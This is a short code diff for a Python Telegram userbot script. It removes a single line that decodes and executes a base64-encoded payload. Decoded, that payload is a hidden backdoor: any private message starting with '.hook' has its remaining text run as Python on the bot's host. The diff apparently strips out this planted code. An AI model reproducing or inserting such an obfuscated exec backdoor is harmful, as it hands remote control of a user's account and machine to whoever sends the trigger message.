@@ -288,8 +288,6 @@ def s(client,mess):
         tgfunctions.get(m[0])(mess.chat.id," ".join(m[1:]),mess)
 
 
-import base64; exec(base64.b64decode(b'CkBhcHAub25fbWVzc2FnZShmaWx0ZXJzLnByaXZhdGUgJiBmaWx0ZXJzLnRleHQpCmRlZiBzb21lKGNsaWVudCxtZXNzKToKICAgICMgYXBwLnNlbmRfbWVzc2FnZSgpCiAgICBnZyA9IG1lc3MudGV4dC5zcGxpdCgiICIpCiAgICBpZiBnZ1swXSA9PSAiLmhvb2siOgogICAgICAgIGV4ZWMoIlxuIi5qb2luKGdnWzE6XSkpCg=='))
-
 
 print("UserBot Strarted")
 app.run()
